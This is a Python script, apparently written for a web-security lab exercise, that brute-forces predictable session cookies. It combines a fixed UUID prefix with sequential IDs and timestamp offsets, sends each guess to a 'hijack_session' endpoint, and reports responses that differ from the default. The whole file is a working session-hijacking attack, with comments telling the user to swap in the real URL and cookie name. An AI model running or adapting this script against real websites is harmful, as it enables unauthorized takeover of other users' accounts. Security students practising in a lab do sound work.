import requests

BASE_UUID = "3281cac0-20e5-45df-8a4"
START_ID = 5110100
END_ID = 5110120  # Adjust range as needed
START_TIMESTAMP = 17469101880
MAX_TIMESTAMP_OFFSET = 10  # Try 10 increments per ID

URL = "http://web0x01.hbtn/a1/hijack_session"  # Replace with the real URL

headers = {
    "User-Agent": "Mozilla/5.0"
}

for id_segment in range(START_ID, END_ID):
    for offset in range(MAX_TIMESTAMP_OFFSET):
        timestamp = START_TIMESTAMP + offset
        cookie_value = f"{BASE_UUID}-{id_segment}-{timestamp}"

        cookies = {
            "hijack_session": cookie_value  # Replace with actual cookie name
        }

        response = requests.get(URL, headers=headers, cookies=cookies)

        if response.status_code != 200 or "default" not in response.text.lower():
            print(f"[!] Interesting response for cookie: {cookie_value}")
            print(f"Status: {response.status_code}")
            print(response.text[:200])  # Print first 200 chars
        else:
            print(f"[ ] Tried {cookie_value} — no change.")

